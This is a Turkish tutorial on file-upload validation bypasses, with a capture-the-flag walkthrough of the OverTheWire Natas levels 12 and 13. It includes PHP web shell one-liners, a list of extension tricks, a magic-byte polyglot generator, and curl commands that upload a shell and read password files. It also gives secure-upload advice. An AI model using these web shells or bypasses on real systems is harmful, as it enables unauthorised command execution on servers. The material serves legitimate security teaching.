# 🌐 Web Güvenliği — Dosya Yükleme (File Upload) Bypass

> Uygulama "sadece resim yükleyebilirsin" diyor.
> Ama "resim" kontrolü nerede yapılıyor — ve nasıl yapılıyor?

---

## 📋 İçindekiler

- [File Upload Zafiyeti Nedir?](#file-upload-zafiyeti-nedir)
- [Doğrulama Yöntemleri ve Bypass'ları](#doğrulama-yöntemleri-ve-bypassları)
- [Web Shell Nedir?](#web-shell-nedir)
- [Magic Bytes (Dosya İmzası)](#magic-bytes-dosya-i̇mzası)
- [Natas'ta Kullanım](#natasta-kullanım)

---

## File Upload Zafiyeti Nedir?

Uygulama dosya yüklemeye izin verdiğinde, yüklenen dosyanın türünü yeterince kontrol etmezse saldırgan PHP, Python veya başka bir dilde çalıştırılabilir kod içeren bir dosya yükleyebilir.

```
Normal: resim.jpg yükle → /uploads/resim.jpg → tarayıcı gösterir
Zafiyet: shell.php yükle → /uploads/shell.php → sunucu çalıştırır!
```

Sunucu PHP dosyasını çalıştırır, saldırgan keyfi komutlar çalıştırabilir.

---

## Doğrulama Yöntemleri ve Bypass'ları

### 1. Uzantı Kontrolü (En Zayıf)

```php
// KÖTÜ: sadece uzantıya bakıyor
$ext = pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION);
if ($ext !== 'jpg' && $ext !== 'png') {
    die("Sadece resim yükleyebilirsiniz!");
}
```

**Bypass:**

```
shell.php        → reddedilir
shell.php.jpg    → kabul edilebilir (bazı sunucularda php olarak çalışır)
shell.pHp        → büyük/küçük harf — bazı filtreleri geçer
shell.php5       → alternatif PHP uzantısı
shell.phtml      → PHP HTML — bazı sunucularda çalışır
shell.phar       → PHP archive
```

### 2. MIME Type Kontrolü (Content-Type Header)

```php
// KÖTÜ: Content-Type header'ına güveniyor — istemci kontrolünde!
if ($_FILES['file']['type'] !== 'image/jpeg') {
    die("Sadece JPEG yükleyebilirsiniz!");
}
```

HTTP isteğinde `Content-Type` header'ı istemci tarafından belirlenir ve Burp Suite veya curl ile kolayca değiştirilebilir.

**Bypass:**

```bash
# curl ile Content-Type'ı sahte göster
curl -F "file=@shell.php;type=image/jpeg" http://example.com/upload.php

# Burp ile: Content-Type: application/x-php  →  Content-Type: image/jpeg
```

### 3. Uzantı + MIME Kontrolü (Orta)

```php
$allowed_ext  = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif'];

$ext  = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
$mime = $_FILES['file']['type'];   // ← hâlâ istemci kontrolünde!

if (!in_array($ext, $allowed_ext) || !in_array($mime, $allowed_mime)) {
    die("Geçersiz dosya!");
}
```

**Bypass:** Dosyayı `shell.jpg` olarak kaydet, Content-Type'ı `image/jpeg` yap, içerik PHP kodu. Bazı sunucularda uzantıya göre çalıştırılmaz ama içeriği sunucu tarafı konfigürasyonuna göre farklı davranabilir.

### 4. exif_imagetype() Kontrolü (Natas 13)

```php
// DAHA İYİ ama hâlâ bypass edilebilir
if (!exif_imagetype($_FILES['file']['tmp_name'])) {
    die("Bu bir resim değil!");
}
```

`exif_imagetype()` dosyanın **ilk birkaç byte'ına** (magic bytes) bakarak türünü belirler. İçeriğin tamamını kontrol etmez.

**Bypass:** Dosyanın başına geçerli bir resim magic byte'ı ekle, geri kalanı PHP kodu yaz.

---

## Web Shell Nedir?

Web shell, web sunucusunda komut çalıştırmayı sağlayan bir dosyadır. En basit PHP web shell:

```php
<?php system($_GET['cmd']); ?>
```

Bu dosyayı sunucuya yüklersen ve URL'den `?cmd=id` gibi parametre gönderirsen:

```
http://example.com/uploads/shell.php?cmd=id
→ uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Farklı Web Shell Örnekleri

```php
<?php system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php echo `$_GET[cmd]`; ?>
```

Natas için en kısa ve kullanışlı:

```php
<?php passthru($_GET['cmd']); ?>
```

---

## Magic Bytes (Dosya İmzası)

Her dosya türü, dosyanın başında sabit byte dizileri taşır. Bu byte'lara **magic bytes** veya **file signature** denir. `file` komutu ve `exif_imagetype()` bu byte'lara bakarak dosya türünü belirler.

| Dosya Türü | Magic Bytes (Hex) | ASCII Karşılığı |
|------------|-------------------|-----------------|
| JPEG | `FF D8 FF` | `ÿØÿ` |
| PNG | `89 50 4E 47 0D 0A 1A 0A` | `‰PNG....` |
| GIF87a | `47 49 46 38 37 61` | `GIF87a` |
| GIF89a | `47 49 46 38 39 61` | `GIF89a` |
| PDF | `25 50 44 46` | `%PDF` |

### JPEG Magic Bytes + PHP Kodu

```
FF D8 FF E0  [JPEG header]  <?php passthru($_GET['cmd']); ?>
```

Bu dosya hem geçerli bir JPEG hem de PHP kodu içeriyor. `exif_imagetype()` başa bakıp "JPEG" der — ama PHP yorumlayıcısı `<?php` bloğunu çalıştırır.

---

## Natas'ta Kullanım

### Natas 12 — Uzantı Bypass

**Kaynak kod (özet):**

```php
<?php
function genRandomString() {
    // 10 karakter rastgele isim üret
    $length = 10;
    $characters = "0123456789abcdefghijklmnopqrstuvwxyz";
    $string = "";
    for ($p = 0; $p < $length; $p++) {
        $string .= $characters[mt_rand(0, strlen($characters)-1)];
    }
    return $string;
}

$target_dir = "upload/";
$target_file = $target_dir . genRandomString() . ".jpg";  // ← uzantı .jpg sabit

if(isset($_POST['filename'])) {
    $target_file = $target_dir . $_POST['filename'];  // ← AMA filename parametresinden alıyor!
}

if(isset($_FILES['uploadedfile'])) {
    if(move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target_file)) {
        print "The file <a href=\"$target_file\">$target_file</a> has been uploaded";
    }
}
?>
<form enctype="multipart/form-data" action="index.php" method="POST">
    <input type="hidden" name="filename" value="[rastgele].jpg">
    <input type="file" name="uploadedfile"><br>
    <input type="submit" value="Upload File">
</form>
```

**Analiz:**

- Form'da gizli `filename` alanı var → değeri `.jpg` ile bitiyor
- Ama sunucu `$_POST['filename']` değerini olduğu gibi kullanıyor
- `filename` değerini `.php` uzantısıyla değiştirirsek sunucu PHP dosyası kaydeder

**Exploit:**

```bash
# Adım 1: Web shell dosyası oluştur
echo '<?php passthru($_GET["cmd"]); ?>' > shell.php

# Adım 2: filename parametresini .php yaparak yükle
curl -u natas12:[şifre] \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell.php" \
     http://natas12.natas.labs.overthewire.org/index.php

# Çıktı: upload/abc123xyz.php linkini verir

# Adım 3: Web shell'i çalıştır
curl -u natas12:[şifre] \
     "http://natas12.natas.labs.overthewire.org/upload/abc123xyz.php?cmd=cat+/etc/natas_webpass/natas13"
```

**Burp Suite ile:**

1. İsteği yakala
2. `filename=...jpg` satırını `filename=shell.php` ile değiştir
3. Forward et → PHP dosyası yüklendi

---

### Natas 13 — exif_imagetype() Bypass

**Kaynak kod (özet):**

```php
<?php
if(isset($_POST['filename'])) {
    if(array_key_exists("uploadedfile", $_FILES)) {
        if($_FILES['uploadedfile']['size'] > 1000) {
            echo "File is too big";
        } else if(!exif_imagetype($_FILES['uploadedfile']['tmp_name'])) {
            echo "File is not an image";  // ← exif_imagetype kontrolü var!
        } else {
            // kaydet
        }
    }
}
?>
```

`exif_imagetype()` magic bytes'a bakıyor. PHP kodumuzu JPEG magic bytes ile başlatmamız gerekiyor.

**Exploit:**

```bash
# Adım 1: JPEG magic bytes + PHP kodu içeren dosya oluştur
python3 -c "
# JPEG magic bytes: FF D8 FF E0
import sys
header = b'\xff\xd8\xff\xe0'
payload = b'<?php passthru(\$_GET[\"cmd\"]); ?>'
sys.stdout.buffer.write(header + payload)
" > shell_jpg.php

# Adım 2: exif_imagetype kontrolünü geç, .php uzantısıyla yükle
curl -u natas13:[şifre] \
     -F "filename=shell.php" \
     -F "uploadedfile=@shell_jpg.php" \
     http://natas13.natas.labs.overthewire.org/index.php

# Adım 3: Shell'i çalıştır
curl -u natas13:[şifre] \
     "http://natas13.natas.labs.overthewire.org/upload/[dosya_adı].php?cmd=cat+/etc/natas_webpass/natas14"
```

**Ne Oluyor?**

```
exif_imagetype() → İlk 4 byte'a bakıyor → FF D8 FF E0 → "JPEG" ✓
PHP yorumlayıcısı → <?php ... ?> bloğunu buluyor → çalıştırıyor ✓
```

---

### Dosya Upload Bypass — Kontrol Listesi

```
Doğrulama türünü tespit et:
  ☐ Sadece uzantı mı? → Farklı uzantı dene (.php5, .phtml)
  ☐ Content-Type mı? → Burp ile image/jpeg yap
  ☐ exif_imagetype mı? → Magic bytes ekle
  ☐ getimagesize() mı? → Geçerli resim + PHP kodu (polyfglot)
  ☐ Form'da hidden input var mı? → filename/extension değiştir

Yükleme sonrası:
  ☐ Dosya nereye kaydediliyor? (link veya kaynak koddan bul)
  ☐ Doğrudan URL ile erişilebiliyor mu?
  ☐ ?cmd=id ile test et
  ☐ Şifreyi oku: ?cmd=cat+/etc/natas_webpass/natas[X]
```

---

### Güvenli Dosya Yükleme

```php
// 1. Uzantı whitelist + MIME whitelist
// 2. exif_imagetype() veya getimagesize() ile içerik doğrula
// 3. Dosyayı web root dışına kaydet (URL ile erişilemesin)
// 4. Dosyayı PHP çalıştıramayacağı bir dizine koy
// 5. Yeni rastgele isim ver (orijinal ismi kullanma)
// 6. İçerik tipi header'ı doğru ayarla (Content-Type: image/jpeg)
```

---

## 🔗 Kaynaklar

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [PayloadsAllTheThings — File Upload](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files)
- [Dosya İmzaları Listesi](https://en.wikipedia.org/wiki/List_of_file_signatures)

---

**Önceki konu:** [09_xor_sifrelemesi.md](./09_xor_sifrelemesi.md)
**Sonraki konu:** [11_sql_injection.md](./11_sql_injection.md)

*Bu rehber [waitaseC137/linux_learning](https://github.com/waitaseC137/linux_learning) reposunun bir parçasıdır.*
